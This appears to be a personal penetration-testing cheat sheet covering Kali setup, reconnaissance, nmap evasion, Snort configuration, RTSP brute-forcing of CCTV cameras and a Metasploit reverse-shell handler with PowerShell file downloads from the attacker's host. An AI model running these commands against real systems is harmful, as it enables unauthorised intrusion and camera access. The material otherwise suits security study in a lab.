# I am the 👁️  in the sky 🔓

## ---VIRTUALIZATION---

You can get Virtualbox or __VMWare Workstation Player__ for free. <br/>

* For bundle file, change permissions, and run it with __sudo ./VMWare__...

* Uncompress the Kali Linux and move the folder to /home/Virtual Machines, you can rename it as just Kali.

* Choose Open Project and then select the folder Kali

>user: kali, password: kali

#      👁️👁️  

## ---GATHERING---

### Information about a site ⛏️

_ping_ google.com <br/>
_nslookup_ google.com <br/>
__ipinfo.info__ <br/>
_whois_ google.com <br/>


### Spoofing your MAC address

_ifconfig_ is the comand to query your active network connection and active newtwork interfaces. <br/>
To change our MAC address, we could: <br/>

```terminal
ifconfig eth0 down
ifconfig eth0 hw ether 00:11:22:33:44:55
ifconfig eth0 up
```

### Examining DNS with dig

```terminal
dig google.com ns
```

_ns_ is for __name server__ <br/>

```terminal
dig nasty-mail-server.com mx
```

_mx_ is for __mail exchange__ <br/>


### whatweb

>whatweb --help

>whatweb arh.bg.ac.rs -v

>whatweb 192.168.1.1-192.16.1.255 --agression 3 -v --no-errors

### SNORT By Cisco

Normally installed in Kali, but you can: <br/>

>sudo apt-get update
>apt-get install snort


* In Windows, install __npcap__ 
* Edit __snort.conf__
* Network to protect: __ipvar HOME_NET 192.168.20.0/24__
* Change type of bar: __var RULE_PATH ..\rules__
* Change type of bar: __var PREPROC_RULE_PATH ..\preproc_rules__
* Change type of bar: __var WHITE_LIST_PATH ..\rules__
* Change type of bar: __var BLACK_LIST_PATH ..\rules__
* Active __config logdir: ..\log__
* Change __dynamicpreprocessor__ directory C:\Snort\lib\snort_dynamicpreprocessor
* Change __dynamicengine__ directory C:\Snort\lib\snort_dynamic\sf_engine.dll
* Disable __dynamicdetection__
* Active: preprocessor sfportscan: proto {all} memcap {10000000}  sense_level {low}
* __preprocessor__ reputation: \ whitelist $WHITE_LIST_PATH/white.rules, \
* __preprocessor__ reputation: \ blacklist $BLACK_LIST_PATH/black.rules, 
* Active: preprocessor arpspoof
* Copy rules from __Linux Version__

__exec__ <br/>

>.\snort.exe -i 5 -A console -c C:\Snort\etc\snort.conf

--

>Hunter

Run: <br/>

```terminal
theHarvester -d domain.com -b all
```

We have the option to load the webpage: __hunter.io__ <br/>

---

#      👁️👁️  

## ---EXPLORATION---

### ---NMAP---

_check active hosts without ports_ <br/>

>nmap -sn -n 192.168.0.0/24

_seek for popular top 5 open ports_ <br/>

>sudo nmap -sS -n --top-ports 5 192.168.0.7

_get a variable for a IP address_ <br/>
_scan to avoid firewalls that blocks ICMP_ <br/>

```terminal
export IP="192.168.1.126"
sudo nmap -PR $IP
```

Maybe, we can get a filtered state, but could be closed <br/>

_send a scan without flags with -sN to see if they are opened_ <br/>

>sudo nmap -sN -p 22,80 $IP

_fragmentation_ <br/>

>sudo nmap -sS -n -ff -p80 192.168.0.4

-f = divides in 8 bytes / or mtu 8<br/>
--ff = divides in 16 bytes <br/>
-p80 = port 80 <br/>

_Decoy_ <br/>

>sudo nmap -sS -n -D 192.168.20.1,ME 192.168.20.128

* __-D__ = Decoy
* First IP addresses are the decoys
* ME = My IP Address
* Last IP the __target__


---


#      👁️👁️  

## ---GAINING ACCESS---



#      👁️👁️  

## ---MAINTAINING ACCESS---


#      👁️👁️  

## ---COVERING TRACKS---



## CCTV

__hack with python__ <br/>

Install python installer: <br>

>apt install python3-pip
>apt install python3-dev pkg-config ffmpeg
>apt install -y libavformat-dev libavcodec-dev \
> libavdevice-dev libavutil-dev libswscale-dev libswresample-dev libavfilter-dev

>pip3 install cython wheel

>pip3 install rtspbrute
>git clone https://gitlab.com/woolf/RTSPbrute.git
>python3 setup.py install
>rtspbrute -t target.txt


## FILE TRANSFERING

>Binaries for msfconsole: testshell, Powerfull-fud

Make a connection to objective machine: <br/>

```console
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.20.137
set lport 4321
exploit
shell
```

Copy the file: <br/>

```terminal
cd folder
echo "hi there" > myfile.txt
python2 -m SimpleHTTPServer
```

Now from objective machine Powershell: <br/>

```powershell
(New-Object System.NET.WebClient).DownloadFile('http://192.168.20.137:8000/myfile.txt','c:\Users\empleado\Desktop\myfile.txt')
```
Or from remote console: <br/>

```terminal
powershell -c (New-Object System.NET.WebClient).DownloadFile('http://192.168.20.137:8000/myfile.txt','c:\Users\empleado\Desktop\myfile.txt')

```

If objective is Linux: <br/>

```terminal
wget http://192.168.20.137:8000/myfile.txt
```

```terminal
impacket-smbserver -smb2support test .
```

Where test is our shared folder and the "." is "this folder" <br/>
We can acces from: \\192.168.20.137 and it will show our __test__ folder. <br/>

From terminal, we can copy: <br/>

```terminal
copy \\192.168.20.137\test\test2.txt test2.txt
```

Annonymous FTP Server: <br/>

```terminal
twistd3 -n ftp -r .
```

```powershell
ftp
open 192.168.20.137 2121
```
#      👁️👁️  

>we can use netcat

>we can use subfinder

>we can use whatweb

>we can use gobuster

>we can use nuclei

>we can use nikto

>we can use ffuf to fuzzing

>we can use burp suite

>we can use commix

>we can use changeme

>we can use gitleaks

>we can use cyberchef

>we can use Load Balancing Detector

>we can use halberd

>we can use wafw00f

>we can use FatRat

>we can use Shodan

>we can use port forwarding

>we can use ngrok

>we can use localtunnel

>we can use msfconsole

>we can use Beef

>we can use cain

>check Apache Guacamole

>check meshcentral

__IDS__ Intrusion Detection System <br/>
__IPS__ Intrusion Prevention System <br/>



